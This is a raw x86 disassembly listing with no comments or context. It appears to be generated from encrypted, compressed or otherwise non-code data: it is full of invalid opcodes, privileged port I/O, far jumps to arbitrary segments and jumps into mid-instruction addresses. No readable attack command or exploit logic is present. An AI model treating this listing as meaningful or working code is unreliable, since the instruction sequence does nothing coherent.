  41b782:	mov    BYTE PTR [eax-0xe],cl
  41b785:	sti    
  41b786:	lock mov eax,0xcc41b321
  41b78c:	arpl   WORD PTR [edi-0x4a],bp
  41b78f:	add    ebx,DWORD PTR [ecx+0x5d]
  41b792:	rol    DWORD PTR [ebp+0x75b684ce],1
  41b798:	aas    
  41b799:	push   esp
  41b79a:	jle    0x41b72a
  41b79c:	adc    dh,BYTE PTR [edx]
  41b79e:	aad    0xf3
  41b7a0:	push   esp
  41b7a1:	inc    edi
  41b7a2:	and    dh,BYTE PTR [edi-0x4ba557a2]
  41b7a8:	pop    ecx
  41b7a9:	push   esp
  41b7aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7ab:	imul   edx,DWORD PTR [ecx],0xffffffe8
  41b7ae:	scas   eax,DWORD PTR es:[edi]
  41b7af:	mov    eax,0xd135e569
  41b7b4:	sub    eax,esi
  41b7b6:	dec    ecx
  41b7b7:	push   edi
  41b7b8:	(bad)  
  41b7b9:	pop    ecx
  41b7ba:	adc    eax,0xef4ff9eb
  41b7bf:	jg     0x41b7b3
  41b7c1:	out    dx,eax
  41b7c2:	push   es
  41b7c3:	into   
  41b7c4:	dec    edi
  41b7c5:	test   al,0x89
  41b7c7:	xor    BYTE PTR [ecx],0x67
  41b7ca:	xor    esp,esp
  41b7cc:	jmp    0x9d65:0x94000b85
  41b7d3:	add    al,0xee
  41b7d5:	in     eax,0xee
  41b7d7:	outs   dx,DWORD PTR ds:[esi]
  41b7d8:	jecxz  0x41b83b
  41b7da:	sbb    ebx,ebx
  41b7dc:	mov    eax,0x9c301ba8
  41b7e1:	inc    esi
  41b7e2:	inc    esi
  41b7e3:	mov    ds:0xe62a7e68,eax
  41b7e8:	dec    edi
  41b7e9:	fs pushf 
  41b7eb:	aaa    
  41b7ec:	pop    ss
  41b7ed:	cld    
  41b7ee:	sub    dl,BYTE PTR [edx+0x53546ea1]
  41b7f4:	pop    esp
  41b7f5:	int    0xff
  41b7f7:	test   eax,0x5a15b3cd
  41b7fc:	not    DWORD PTR [ebp-0x2c]
  41b7ff:	in     al,0x44
  41b801:	mov    ebp,0x8c086544
  41b806:	dec    eax
  41b807:	fucomi st,st(7)
  41b809:	mov    dl,0x42
  41b80b:	dec    ecx
  41b80c:	xor    eax,ebp
  41b80e:	inc    esi
  41b80f:	mov    edx,0x389ea4c2
  41b814:	push   ebp
  41b815:	jb     0x41b81e
  41b817:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b818:	sbb    eax,0x1bd5713a
  41b81d:	inc    esp
  41b81e:	mov    esi,0xb03412a6
  41b823:	loopne 0x41b7d6
  41b825:	mov    esp,0x4d24749e
  41b82a:	inc    ebx
  41b82b:	cdq    
  41b82c:	sub    al,0x8d
  41b82e:	inc    eax
  41b82f:	lea    esi,[esi]
  41b831:	mov    BYTE PTR [ecx],dl
  41b833:	neg    DWORD PTR [esi+0x31995e3]
  41b839:	pop    ss
  41b83a:	xchg   ebx,eax
  41b83b:	jp     0x41b7fc
  41b83d:	test   al,0x2b
  41b83f:	sub    ch,BYTE PTR [eax]
  41b841:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b842:	sub    ebp,DWORD PTR [ebx+edx*8+0x4cde066d]
  41b849:	sar    dl,1
  41b84b:	loopne 0x41b855
  41b84d:	cmp    eax,0xfc34422c
  41b852:	or     esp,ebx
  41b854:	or     ecx,DWORD PTR [eax-0x2c97840e]
  41b85a:	cmp    eax,DWORD PTR ss:[esi]
  41b85d:	cli    
  41b85e:	jge    0x41b8cd
  41b860:	adc    DWORD PTR [ecx+0x73776169],ebx
  41b866:	and    al,0x72
  41b868:	add    eax,0x132fd6a0
  41b86d:	std    
  41b86e:	call   0xe90:0x965f9580
  41b875:	ins    DWORD PTR es:[edi],dx
  41b876:	adc    eax,0xe138ed1d
  41b87b:	je     0x41b8c0
  41b87d:	ret    0xec00
  41b880:	cli    
  41b881:	in     eax,dx
  41b882:	fiadd  DWORD PTR [esi]
  41b884:	js     0x41b85f
  41b886:	jmp    0xac6:0x5c85a88
  41b88d:	xchg   ah,ah
  41b88f:	fnstenv ds:[ebx]
  41b892:	jb     0x41b88b
  41b894:	mov    ebp,0xea5fc9e0
  41b899:	inc    edx
  41b89a:	ffreep st(3)
  41b89c:	push   esi
  41b89d:	jnp    0x41b8bc
  41b89f:	add    dh,BYTE PTR [bp+di-0x5a]
  41b8a3:	push   0xffffff87
  41b8a5:	lds    ecx,FWORD PTR [edx+0x12]
  41b8a8:	fsin   
  41b8aa:	iret   
  41b8ab:	or     DWORD PTR ds:0x6919342d,0xc
  41b8b2:	mov    bh,ah
  41b8b4:	sub    BYTE PTR [edi+0x6a],bh
  41b8b7:	add    al,0xf1
  41b8b9:	mov    dh,0x61
  41b8bb:	loopne 0x41b91d
  41b8bd:	sub    BYTE PTR [ebx],dl
  41b8bf:	into   
  41b8c0:	ins    DWORD PTR es:[edi],dx
  41b8c1:	mov    ah,0xd8
  41b8c3:	and    al,0x8
  41b8c5:	adc    bl,BYTE PTR [ecx-0x4]
  41b8c8:	jecxz  0x41b8cf
  41b8ca:	cmp    eax,0xc3f218af
  41b8cf:	jmp    0xbfe097b2
  41b8d4:	outs   dx,DWORD PTR ds:[esi]
  41b8d5:	mov    ds:0x2612f844,al
  41b8da:	and    DWORD PTR [ebp-0x2b],0xa813f928
  41b8e1:	test   al,0xac
  41b8e3:	clc    
  41b8e4:	add    dh,BYTE PTR ds:0x6090ff3e
  41b8ea:	inc    eax
  41b8eb:	adc    al,0x8f
  41b8ed:	push   es
  41b8ee:	popa   
  41b8ef:	lods   al,BYTE PTR ds:[esi]
  41b8f0:	sub    al,0xea
  41b8f2:	mov    bh,0x1b
  41b8f4:	ficom  DWORD PTR [ebx-0x2edb179b]
  41b8fa:	adc    edi,ebp
  41b8fc:	add    dh,BYTE PTR [ebx]
  41b8fe:	iret   
  41b8ff:	jecxz  0x41b928
  41b901:	xchg   esp,eax
  41b902:	mov    bl,0x19
  41b904:	jbe    0x41b937
  41b906:	pop    esi
  41b907:	call   0x7c6d4020
  41b90c:	cmp    DWORD PTR [ecx-0x54],edi
  41b90f:	pop    esi
  41b910:	mov    DWORD PTR [edx-0x1068009d],eax
  41b916:	inc    edx
  41b917:	adc    bl,cl
  41b919:	xchg   ebp,eax
  41b91a:	int    0xa1
  41b91c:	xchg   ebx,eax
  41b91d:	(bad)
  41b922:	shr    BYTE PTR [bx+si-0x41],cl
  41b926:	out    0xbe,eax
  41b928:	outs   dx,DWORD PTR ds:[esi]
  41b929:	mov    edi,0xb8546562
  41b92e:	mov    ebp,0x49d480b9
  41b933:	push   ebp
  41b934:	pop    edx
  41b935:	xchg   esp,eax
  41b936:	xor    cl,ah
  41b938:	mov    edx,0xd35f6835
  41b93d:	xor    esi,DWORD PTR ds:0x53e44036
  41b943:	in     eax,dx
  41b944:	push   ecx
  41b945:	pop    ds
  41b946:	sbb    al,BYTE PTR [eax]
  41b948:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b949:	pop    es
  41b94a:	aam    0x7a
  41b94c:	push   es
  41b94d:	arpl   cx,ax
  41b94f:	push   ecx
  41b950:	xchg   ebp,eax
  41b951:	das    
  41b952:	jmp    0xdd9be80d
  41b957:	iret   
  41b958:	mov    cl,0xb2
  41b95a:	mov    dh,0x42
  41b95c:	arpl   WORD PTR [ecx-0x481a1fbe],si
  41b962:	mov    bh,0x21
  41b964:	mov    gs,WORD PTR [esi]
  41b966:	aad    0xa
  41b968:	aaa    
  41b969:	cmp    dl,BYTE PTR [ebx]
  41b96b:	loope  0x41b9a7
  41b96d:	lods   al,BYTE PTR ds:[esi]
  41b96e:	jl     0x41b939
  41b970:	int3   
  41b971:	sub    dh,cl
  41b973:	stos   DWORD PTR es:[edi],eax
  41b974:	mov    gs,WORD PTR [eax+0x2cfac1ee]
  41b97a:	push   ds
  41b97b:	xchg   BYTE PTR [esp+eiz*2-0x3e7ccc17],cl
  41b982:	fs popa 
  41b984:	lds    esp,FWORD PTR [esi-0x3fc9a2d7]
  41b98a:	cmp    bl,BYTE PTR [ebx+0x20]
  41b98d:	pushf  
  41b98e:	stc    
  41b98f:	test   eax,0xee7ed0ad
  41b994:	push   ecx
  41b995:	cmp    esi,edx
  41b997:	ror    DWORD PTR [edx+0x74ecd5ac],1
  41b99d:	xor    edi,ecx
  41b99f:	add    BYTE PTR [eax+0x44],al
  41b9a2:	and    ecx,esi
  41b9a4:	stc    
  41b9a5:	jae    0x41b9fa
  41b9a7:	sub    cl,BYTE PTR [edx+0x25]
  41b9aa:	or     ch,dh
  41b9ac:	sub    eax,0xadb5b134
  41b9b1:	cmp    cl,BYTE PTR ss:[ecx]
  41b9b4:	scas   eax,DWORD PTR es:[edi]
  41b9b5:	cmp    BYTE PTR [ebx+0x4],dl
  41b9b8:	ins    BYTE PTR es:[edi],dx
  41b9b9:	add    al,0xad
  41b9bb:	push   0x40
  41b9bd:	in     al,dx
  41b9be:	pop    edx
  41b9bf:	push   0x5f
  41b9c1:	lds    esi,FWORD PTR [esi+0x11]
  41b9c4:	add    eax,0xe04e2003
  41b9c9:	sub    ch,BYTE PTR [edx-0x14]
  41b9cc:	loopne 0x41ba01
  41b9ce:	pushf  
  41b9cf:	aas    
  41b9d0:	jl     0x41b97e
  41b9d2:	adc    esp,DWORD PTR [ecx]
  41b9d4:	mov    BYTE PTR [edx],0x22
  41b9d7:	stos   BYTE PTR es:[edi],al
  41b9d8:	clc    
  41b9d9:	sub    bl,dh
  41b9db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9dc:	pop    ss
  41b9dd:	mov    al,ds:0x3debe325
  41b9e2:	add    dl,BYTE PTR [ecx]
  41b9e4:	clc    
  41b9e5:	mov    ch,0x5b
  41b9e7:	jl     0x41b969
  41b9e9:	fimul  DWORD PTR [eax-0x38319c93]
  41b9ef:	bound  ebp,QWORD PTR [edi-0x5b]
  41b9f2:	pusha  
  41b9f3:	(bad)  
  41b9f4:	fistp  DWORD PTR [esi]
  41b9f6:	into   
  41b9f7:	mov    dh,0x34
  41b9f9:	jno    0x41b9d5
  41b9fb:	pop    edx
  41b9fc:	sbb    al,0xbf
  41b9fe:	pop    ss
  41b9ff:	adc    ah,BYTE PTR [ecx+0x46bf5882]
  41ba05:	and    ecx,edx
  41ba07:	iret   
  41ba08:	mov    DWORD PTR [ebp-0x14],ebp
  41ba0b:	add    BYTE PTR [ecx],ch
  41ba0d:	mov    edx,0x30e763d0
  41ba12:	jbe    0x41b9b8
  41ba14:	sub    DWORD PTR [edi+0x4b],ecx
  41ba17:	loop   0x41ba5c
  41ba19:	shl    DWORD PTR [eax],1
  41ba1b:	iret   
  41ba1c:	add    al,0x0
  41ba1e:	and    bh,dh
  41ba20:	retfw  
  41ba22:	nop
  41ba23:	cli    
  41ba24:	mov    al,0x2a
  41ba26:	add    eax,0x3b7326b1
  41ba2b:	add    al,0x19
  41ba2d:	scas   eax,DWORD PTR es:[edi]
  41ba2e:	jno    0x41b9e5
  41ba30:	popf   
  41ba31:	jmp    0x41b9f0
  41ba33:	push   0x52
  41ba35:	jne    0x41ba96
  41ba37:	(bad)  
  41ba38:	in     eax,0x16
  41ba3a:	push   es
  41ba3b:	or     eax,0x954d572c
  41ba40:	inc    esp
  41ba41:	add    eax,0xf8db0451
  41ba46:	(bad)  
  41ba47:	retf   0x6ae8
  41ba4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba4b:	out    0xca,al
  41ba4d:	pop    edx
  41ba4e:	int3   
  41ba4f:	and    al,0xcb
  41ba51:	xor    ch,BYTE PTR [ecx]
  41ba53:	dec    ecx
  41ba54:	inc    ecx
  41ba55:	stos   BYTE PTR es:[edi],al
  41ba56:	scas   al,BYTE PTR es:[edi]
  41ba57:	mov    DWORD PTR [ebx-0xec3ab11],ecx
  41ba5d:	or     eax,0xf508a685
  41ba62:	aam    0x38
  41ba64:	add    eax,DWORD PTR [ecx]
  41ba66:	push   edx
  41ba67:	cmp    al,0x97
  41ba69:	outs   dx,DWORD PTR ds:[esi]
  41ba6a:	lds    esi,FWORD PTR [esi]
  41ba6c:	jle    0x41ba3d
  41ba6e:	or     al,0x58
  41ba70:	dec    ecx
  41ba71:	xchg   ebp,eax
  41ba72:	test   edx,ebx
  41ba74:	xor    al,0x7a
  41ba76:	pop    esi
  41ba77:	sar    DWORD PTR [ecx+0x24],cl
  41ba7a:	jmp    0x41ba40
  41ba7c:	loope  0x41ba1a
  41ba7e:	lods   eax,DWORD PTR ds:[esi]
  41ba7f:	aad    0xdb
  41ba81:	xchg   edx,eax
  41ba82:	adc    eax,0xdafa2377
  41ba87:	(bad)  
  41ba88:	int    0x97
  41ba8a:	inc    ebx
  41ba8b:	dec    esp
  41ba8c:	sahf   
  41ba8d:	iret   
  41ba8e:	push   eax
  41ba8f:	cmp    DWORD PTR [esi],ebx
  41ba91:	(bad)  
  41ba92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba93:	(bad)  
  41ba94:	repz mov edx,0x124cbbd6
  41ba9a:	ja     0x41bb04
  41ba9c:	pop    eax
  41ba9d:	pop    ss
  41ba9e:	adc    bl,bl
  41baa0:	xchg   ebx,eax
  41baa1:	mov    BYTE PTR [eax-0x2b56b715],ah
  41baa7:	pop    ebp
  41baa8:	sbb    BYTE PTR [eax*2-0x10bdb02a],bh
  41baaf:	xor    ebp,DWORD PTR [ecx-0x2fa040ee]
  41bab5:	imul   BYTE PTR [ecx+eiz*4-0x1c]
  41bab9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41baba:	sar    ebx,0x0
  41babd:	inc    ebp
  41babe:	scas   al,BYTE PTR es:[edi]
  41babf:	sbb    DWORD PTR [edx],edi
  41bac1:	leave  
  41bac2:	dec    ebp
  41bac3:	pop    esp
  41bac4:	sbb    esi,esp
  41bac6:	popf   
  41bac7:	sahf   
  41bac8:	pop    es
  41bac9:	dec    edx
  41baca:	pop    edi
  41bacb:	mov    edi,DWORD PTR [ecx+0x63b1a1e4]
  41bad1:	fisub  WORD PTR [esi+0x1418068e]
  41bad7:	jne    0x41ba7a
  41bad9:	push   ecx
  41bada:	push   0x2d
  41badc:	imul   ecx,DWORD PTR [edx*4-0x4993290b],0x2d
  41bae4:	and    BYTE PTR [eax-0x5ad50e77],dh
  41baea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41baeb:	inc    ebx
  41baec:	mov    ebx,0x795c1355
  41baf1:	push   ss
  41baf2:	(bad)  
  41baf3:	cwde   
  41baf4:	pop    ds
  41baf5:	mov    bh,0x71
  41baf7:	out    0x16,al
  41baf9:	ins    BYTE PTR es:[edi],dx
  41bafa:	add    eax,DWORD PTR [ebp+0x462287a0]
  41bb00:	inc    esi
  41bb01:	ins    DWORD PTR es:[edi],dx
  41bb02:	sti    
  41bb03:	out    0x7e,al
  41bb05:	stos   DWORD PTR es:[edi],eax
  41bb06:	mov    WORD PTR [ebp+0x77],ss
  41bb09:	sbb    ah,BYTE PTR [ecx]
  41bb0b:	mov    bh,0x89
  41bb0d:	add    eax,0x4e12cb79
  41bb12:	(bad)  [ebp+0x7]
  41bb15:	test   al,0x5d
  41bb17:	sbb    dl,BYTE PTR [eax+0x71ac8274]
  41bb1d:	cs dec ecx
  41bb1f:	or     dh,BYTE PTR [esi-0x1fc5e1f7]
  41bb25:	fisttp WORD PTR [esi+0x48]
  41bb28:	rcl    DWORD PTR [eax],1
  41bb2a:	mov    eax,ds:0x67f27fac
  41bb2f:	pop    edi
  41bb30:	pop    edi
  41bb31:	icebp  
  41bb32:	and    eax,0x3f098bd2
  41bb37:	jo     0x41babb
  41bb39:	retf   0xbc0
  41bb3c:	xchg   BYTE PTR [ecx],dh
  41bb3e:	xchg   ebx,eax
  41bb3f:	push   eax
  41bb40:	adc    al,0xbf
  41bb42:	shl    DWORD PTR [esi+0x7ce3aeb4],0x23
  41bb49:	jge    0x41bb53
  41bb4b:	loop   0x41bb44
  41bb4d:	lahf   
  41bb4e:	xchg   ebp,eax
  41bb4f:	jb     0x41bb9c
  41bb51:	aad    0x8d
  41bb53:	call   0xecee2672
  41bb58:	pop    ss
  41bb59:	xchg   esi,eax
  41bb5a:	mov    ecx,DWORD PTR [ebx-0x6ff7a423]
  41bb60:	(bad)  
  41bb61:	jno    0x41baf3
  41bb63:	fwait
  41bb64:	std    
  41bb65:	repz stc 
  41bb67:	add    bh,BYTE PTR ds:0x438961da
  41bb6d:	inc    eax
  41bb6e:	jbe    0x41bb89
  41bb70:	mov    ds:0xf2403758,eax
  41bb75:	aam    0x14
  41bb77:	jno    0x41bb41
  41bb79:	and    edi,DWORD PTR [edx-0x59]
  41bb7c:	inc    ebx
  41bb7d:	fadd   DWORD PTR [esi]
  41bb7f:	cmp    DWORD PTR [ecx+0x19],ebx
  41bb82:	cmp    DWORD PTR [edi-0x6f],ecx
  41bb85:	push   cs
  41bb86:	push   ss
  41bb87:	inc    ecx
  41bb88:	enter  0x5eee,0x9b
  41bb8c:	and    al,0xa7
  41bb8e:	aas    
  41bb8f:	sbb    BYTE PTR [eax+esi*8-0x172c910e],al
  41bb96:	scas   eax,DWORD PTR es:[edi]
  41bb97:	mov    esp,0x970638ab
  41bb9c:	test   DWORD PTR ds:0xfaa040fb,ebp
  41bba2:	push   0x79
  41bba4:	jns    0x41bb29
  41bba6:	mov    ah,0x1e
  41bba8:	repz popf 
  41bbaa:	push   es
  41bbab:	hlt    
  41bbac:	not    ebx
  41bbae:	jns    0x41bc1c
  41bbb0:	push   ecx
  41bbb1:	dec    ebx
  41bbb2:	xor    al,0x36
  41bbb4:	mov    dh,0xb9
  41bbb6:	mov    dl,0xcf
  41bbb8:	jecxz  0x41bbff
  41bbba:	and    eax,DWORD PTR [esi+0x68]
  41bbbd:	lea    ebp,[ebx-0x1a17daba]
  41bbc3:	xor    cl,BYTE PTR [eax]
  41bbc5:	push   ebx
  41bbc6:	pusha  
  41bbc7:	mov    ebp,0xb513a832
  41bbcc:	xchg   ebp,eax
  41bbcd:	hlt    
  41bbce:	jmp    0x41bb9b
  41bbd0:	mov    al,0xd0
  41bbd2:	push   cs
  41bbd3:	fisubr DWORD PTR [ebp+0x54e0da36]
  41bbd9:	repnz pop esi
  41bbdb:	je     0x41bbb7
  41bbdd:	outs   dx,DWORD PTR ds:[esi]
  41bbde:	xor    edx,edx
  41bbe0:	iret   
  41bbe1:	xor    DWORD PTR [ebx],0xd3356e24
  41bbe7:	stc    
  41bbe8:	dec    edx
  41bbe9:	not    BYTE PTR [edi]
  41bbeb:	xchg   edi,eax
  41bbec:	or     DWORD PTR [ebx],edi
  41bbee:	pop    es
  41bbef:	mov    ebx,0x8a8bf286
  41bbf4:	sub    dh,dh
  41bbf6:	ficomp WORD PTR [ecx+0x7ad3a214]
  41bbfc:	fs sahf 
  41bbfe:	xlat   BYTE PTR ds:[ebx]
  41bbff:	sub    al,0x46
  41bc01:	data16 adc BYTE PTR [ecx-0x2d],bl
  41bc05:	adc    BYTE PTR [eax],ah
  41bc07:	push   edx
  41bc08:	ror    BYTE PTR [eax-0x4e],1
  41bc0b:	sbb    ebp,ebx
  41bc0d:	loopne 0x41bbd8
  41bc0f:	or     bl,ah
  41bc11:	cmp    BYTE PTR ds:0x6ad57f1c,ch
  41bc17:	mov    ah,BYTE PTR [eax]
  41bc19:	cmp    al,0xfe
  41bc1b:	fisttp QWORD PTR [eax+0x59]
  41bc1e:	addr16 (bad) 
  41bc20:	ins    DWORD PTR es:[edi],dx
  41bc21:	mov    ds:0xbf8f9e3f,al
  41bc26:	fwait
  41bc27:	inc    BYTE PTR [esi-0x18]
  41bc2a:	fsub   QWORD PTR [ecx+0x60910216]
  41bc30:	or     BYTE PTR [eax+0x0],0x86
  41bc34:	push   ebx
  41bc35:	mov    edx,DWORD PTR [ebx]
  41bc37:	xlat   BYTE PTR ds:[ebx]
  41bc38:	cmp    al,0x51
  41bc3a:	scas   eax,DWORD PTR es:[edi]
  41bc3b:	xor    ch,BYTE PTR [edx+0x2]
  41bc3e:	mov    ebp,0x6b400f09
  41bc43:	sbb    edx,DWORD PTR [edx+0x31d923f]
  41bc49:	adc    eax,0x8b432cb1
  41bc4e:	pop    ebx
  41bc4f:	lods   eax,DWORD PTR ds:[esi]
  41bc50:	lahf   
  41bc51:	cmp    dl,BYTE PTR [edi]
  41bc53:	pop    ecx
  41bc54:	mov    edx,0xccb14b5d
  41bc59:	out    0x6d,eax
  41bc5b:	or     dl,BYTE PTR [eax+0x1d]
  41bc5e:	stos   BYTE PTR es:[edi],al
  41bc5f:	test   DWORD PTR [edx+0x42],ebx
  41bc62:	sbb    al,0xe0
  41bc64:	cmp    al,0x9f
  41bc66:	mov    esi,0xa785b944
  41bc6b:	xchg   esi,eax
  41bc6c:	mov    dl,0x9
  41bc6e:	pop    es
  41bc6f:	jo     0x41bca9
  41bc71:	or     ebx,eax
  41bc73:	call   DWORD PTR [ebx-0x786367c5]
  41bc79:	push   edx
  41bc7a:	out    dx,al
  41bc7b:	pop    edx
  41bc7c:	xor    DWORD PTR [ecx+0x55],ebx
  41bc7f:	addr16 pop ebx
  41bc81:	add    edi,ebx
  41bc83:	push   edx
  41bc84:	add    DWORD PTR [edi+0x160c38f5],0x5a28876a
  41bc8e:	fst    QWORD PTR [eax]
  41bc90:	inc    edx
  41bc91:	lods   eax,DWORD PTR ds:[esi]
  41bc92:	ja     0x41bc21
  41bc94:	mov    WORD PTR [eax],es
  41bc96:	or     eax,DWORD PTR [ecx-0x2a]
  41bc99:	ins    BYTE PTR es:[edi],dx
  41bc9a:	jbe    0x41bc4f
  41bc9c:	sub    al,0x47
  41bc9e:	jmp    0xfc1b:0x8d3d7b97
  41bca5:	mov    cl,0x5a
  41bca7:	es sahf 
  41bca9:	sbb    edi,ebp
  41bcab:	outs   dx,DWORD PTR ds:[esi]
  41bcac:	and    esi,DWORD PTR [ecx]
  41bcae:	mov    al,ds:0xeefa994d
  41bcb3:	popf   
  41bcb4:	dec    ecx
  41bcb5:	mov    eax,0x610c9818
  41bcba:	call   0x35a4:0xf3630f23
  41bcc1:	cwde   
  41bcc2:	(bad)  
  41bcc4:	sbb    esi,ebx
  41bcc6:	mov    ebx,0x6740a850
  41bccb:	mov    cs,WORD PTR [edi+0x84dce2b]
  41bcd1:	rcr    eax,cl
  41bcd3:	inc    edi
  41bcd4:	dec    edx
  41bcd6:	fdivr  st,st(1)
  41bcd8:	xchg   edi,eax
  41bcd9:	mov    esi,0x62baa705
  41bcde:	push   edi
  41bcdf:	es adc cl,dl
  41bce2:	mov    esp,0x737ad030
  41bce7:	mov    edx,0x70a12cf0
  41bcec:	(bad)  
  41bced:	xchg   ecx,eax
  41bcee:	mov    ?,ebp
  41bcf0:	or     eax,0xb0882228
  41bcf5:	adc    BYTE PTR [bp+di],0x13
  41bcf9:	mov    esp,0x7fdc2c6e
  41bcfe:	dec    edi
  41bcff:	jmp    0xda40bfe6
  41bd04:	mov    eax,ds:0x6363adb8
  41bd09:	(bad)  
  41bd0a:	cld    
  41bd0b:	retf   
  41bd0c:	xchg   ecx,eax
  41bd0d:	stos   DWORD PTR es:[edi],eax
  41bd0e:	mov    eax,0x56cc740b
  41bd13:	sbb    DWORD PTR [eax+0x18],esi
  41bd16:	inc    esp
  41bd17:	xor    bh,ch
  41bd19:	das    
  41bd1a:	jge    0x41bd90
  41bd1c:	daa    
  41bd1d:	in     al,0x49
  41bd1f:	dec    ebx
  41bd20:	sbb    eax,0x7587c7f0
  41bd25:	dec    esi
  41bd26:	dec    esi
  41bd27:	push   edx
  41bd28:	push   ecx
  41bd29:	jmp    0xfae0bce4
  41bd2e:	and    bl,BYTE PTR [edx-0x7a207974]
  41bd34:	cmp    eax,0xddc7f61b
  41bd39:	in     eax,dx
  41bd3a:	sahf   
  41bd3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd3c:	push   ds
  41bd3d:	mov    dh,0xaf
  41bd3f:	stos   BYTE PTR es:[edi],al
  41bd40:	loope  0x41bcd6
  41bd42:	push   esi
  41bd43:	mov    ebx,0x1fa4df8f
  41bd48:	push   edi
  41bd49:	aaa    
  41bd4a:	xor    eax,0x7511233e
  41bd4f:	aas    
  41bd50:	add    DWORD PTR [edx+0x3a47c5c8],esp
  41bd56:	or     dh,dl
  41bd58:	push   ds
  41bd59:	popf   
  41bd5a:	jg     0x41bdd9
  41bd5c:	scas   eax,DWORD PTR es:[edi]
  41bd5d:	aam    0x9d
  41bd5f:	aad    0x23
  41bd61:	adc    DWORD PTR [esi+0x2d],esp
  41bd64:	xchg   esi,eax
  41bd65:	mov    ds:0xea94d733,eax
  41bd6a:	aad    0xbc
  41bd6c:	sbb    BYTE PTR [edx],0x49
  41bd6f:	xor    al,0xf
  41bd71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd73:	sti    
  41bd74:	in     eax,0x36
  41bd76:	aad    0x36
  41bd78:	fsub   st,st(0)
  41bd7a:	mov    edx,0xf2ade3f8
  41bd7f:	ret    
  41bd80:	or     BYTE PTR [eiz*1+0x13bcda01],0x66
  41bd88:	ins    DWORD PTR es:[edi],dx
  41bd89:	ret    0x11fc
  41bd8c:	dec    esp
  41bd8d:	mov    ah,0xb8
  41bd8f:	fwait
  41bd90:	call   0xb669e2cd
  41bd95:	sub    eax,0x9c5784a6
  41bd9a:	jecxz  0x41bd7d
  41bd9c:	pop    edi
  41bd9d:	out    0x63,al
  41bd9f:	sbb    BYTE PTR ds:[ecx-0x68],ch
  41bda3:	pop    ss
  41bda4:	int3   
  41bda5:	mov    cl,0x3b
  41bda7:	jmp    0x41bdaf
  41bda9:	in     eax,0x6a
  41bdab:	repnz cmc 
  41bdad:	lea    esi,[edx-0x1006b5bd]
  41bdb3:	cmp    DWORD PTR [ebx-0x11620f46],edx
  41bdb9:	lock xchg edi,eax
  41bdbb:	cwde   
  41bdbc:	pop    ecx
  41bdbd:	pop    ds
  41bdbe:	jo     0x41bdd9
  41bdc0:	add    al,0xbd
  41bdc2:	xor    dl,al
  41bdc4:	or     al,0x40
  41bdc6:	dec    eax
  41bdc7:	sub    ebp,DWORD PTR ds:0x595cb498
  41bdcd:	jb     0x41bdf0
  41bdcf:	fcomi  st,st(5)
  41bdd1:	add    BYTE PTR [edi+ebx*1+0x2],dh
  41bdd5:	and    al,0x2
  41bdd7:	sub    eax,0x7c312c53
  41bddc:	sub    BYTE PTR [ecx+0x7],dh
  41bddf:	mov    eax,ds:0x8fd4c287
  41bde4:	mov    bh,0x28
  41bde6:	mov    eax,ds:0x174856e3
  41bdeb:	sub    eax,0xc09ee0b2
  41bdf0:	jmp    0x85a8fd86
  41bdf5:	retf   0xfad8
  41bdf8:	xor    ecx,DWORD PTR [esi]
  41bdfa:	xchg   DWORD PTR [ecx+ecx*1+0x1b1ed237],edi
  41be01:	aas    
  41be02:	outs   dx,BYTE PTR ds:[esi]
  41be03:	retf   0xabd0
  41be06:	jmp    0x41bdac
  41be08:	jmp    0x41be75
  41be0a:	xor    DWORD PTR [eax+0x2d6a7b74],esp
  41be10:	push   ss
  41be11:	fcomp  DWORD PTR [ebx]
  41be13:	out    dx,al
  41be14:	cld    
  41be15:	push   cs
  41be16:	xchg   ecx,eax
  41be17:	ins    BYTE PTR es:[edi],dx
  41be18:	mov    DWORD PTR [eax+edx*8-0x22f07c15],eax
  41be1f:	out    0x3e,eax
  41be21:	mov    edx,0x37b9ae21
  41be26:	xchg   edx,eax
  41be27:	iret   
  41be28:	mov    cs,WORD PTR [edx]
  41be2a:	retf   0x73
  41be2d:	dec    edi
  41be2e:	lods   eax,DWORD PTR ds:[esi]
  41be2f:	sub    ah,BYTE PTR gs:[esi+0x45]
  41be33:	stc    
  41be34:	pop    esi
  41be35:	pop    es
  41be36:	mov    ecx,0x66ef12a9
  41be3b:	and    ebx,ebp
  41be3d:	ret    0x9e4
  41be40:	mov    bl,0x66
  41be42:	fsub   DWORD PTR [ecx-0x4421872c]
  41be48:	cmc    
  41be49:	inc    edx
  41be4a:	inc    eax
  41be4b:	int    0x54
  41be4d:	jne    0x41bdfe
  41be4f:	jae    0x41be5e
  41be51:	sub    BYTE PTR ds:0x6ff31d6c,bh
  41be57:	add    ebp,ecx
  41be59:	lea    edx,[ebx]
  41be5b:	cli    
  41be5c:	sbb    eax,0x470be5c0
  41be61:	xchg   ebp,edi
  41be63:	fbld   TBYTE PTR [eax]
  41be65:	or     DWORD PTR [edi+ebp*2+0x11fa9c80],ecx
  41be6c:	add    bh,cl
  41be6e:	mov    dh,0x2d
  41be70:	fistp  DWORD PTR ds:0xe5037f9f
  41be76:	mov    ds:0x99873ca8,al
  41be7b:	in     al,0xea
  41be7d:	xchg   DWORD PTR ss:[edi],ebx
  41be80:	addr16 adc edx,esp
  41be83:	aaa    
  41be84:	int    0xf5
  41be86:	sbb    ch,al
  41be88:	sub    eax,0x6e8bbc52
  41be8d:	jle    0x41be59
  41be8f:	mov    al,0x4d
  41be91:	stc    
  41be92:	shl    DWORD PTR ds:0xe9b6bb7b,1
  41be98:	mov    bh,0x40
  41be9a:	rcr    DWORD PTR [ecx+0x5c7b9c34],cl
  41bea0:	and    ch,BYTE PTR [edx]
  41bea2:	popf   
  41bea3:	scas   eax,DWORD PTR es:[edi]
  41bea4:	adc    eax,0x28bb5671
  41bea9:	(bad)  
  41beaa:	lahf   
  41beab:	and    al,0x3c
  41bead:	mov    dh,0x24
  41beaf:	in     eax,dx
  41beb0:	adc    esp,DWORD PTR [eax]
